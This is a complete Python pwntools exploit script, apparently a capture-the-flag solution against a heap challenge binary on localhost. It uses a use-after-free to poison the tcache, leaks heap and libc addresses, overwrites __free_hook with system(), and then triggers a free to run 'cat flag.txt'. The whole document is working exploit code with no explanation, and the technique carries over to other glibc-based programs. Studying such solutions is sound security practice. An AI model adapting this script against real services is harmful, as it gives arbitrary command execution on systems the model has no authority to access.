#!/bin/python3
from pwn import *
r = remote("localhost", 2442)
elf = ELF("./chall",checksec=False)
#r = elf.process()
libc = ELF("./libc.so.6",checksec=False)

def add(index, size):
    r.sendline(b"add")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    r.recvuntil(b"quit\n")


def remove(index):
    r.sendline(b"remove")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.recvuntil(b"quit\n")


def send(index, msg):
    r.sendline(b"send")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Send message: ", msg)
    r.recvuntil(b"quit\n")


def read(index):
    r.sendline(b"read")
    r.sendlineafter(b"Index: ", str(index).encode())
    addr = r.recvline()[:-1]+b"\x00\x00"
    r.recvuntil(b"quit\n")
    return addr


def alloc_at(address,index):
    address = p64(address)
    add(index+1, 32)
    add(index, 32)
    remove(index+1)
    remove(index)
    send(index, address+b"\x00")
    add(index, 32)
    add(index, 32)
    return index



def main():
	add(0, 16)
	add(1, 16)
	remove(0)
	remove(1)
	heap_leak = u64(read(1))
	log.info(f"heap leak {hex(heap_leak)}")
	addr_of_ptr_to_libc = heap_leak+0xd0

	log.info(f"address of ptr to libc {hex(addr_of_ptr_to_libc)}")
	add(0, 0x80)
	add(1, 0x508)
	add(2, 0x410)
	remove(1)
	add(1, 0x508)
	libc_addr_index = alloc_at(addr_of_ptr_to_libc,8)
	libc_leak = read(libc_addr_index)
	if len(libc_leak) != 8 :
		log.error("Try again")
	libc_leak = u64(libc_leak)
	libc.address = libc_leak-0x1ecbe0
	log.info(f"libc address {hex(libc.address)}")

	free_hook = libc.symbols['__free_hook']
	log.info(f"__free_hook address {hex(free_hook)}")
	system = libc.address+0x000522c0
	log.info(f"system address {hex(system)}")

	free_hook_index = alloc_at(free_hook,10)
	send(free_hook_index, p64(system))
	
	add(0, 32)
	send(0, b"cat flag.txt\x00")
	r.sendline(b"remove")
	r.sendlineafter(b"Index: ", b"0")
	print("Flag:", r.recvuntil(b"}").decode())

main()
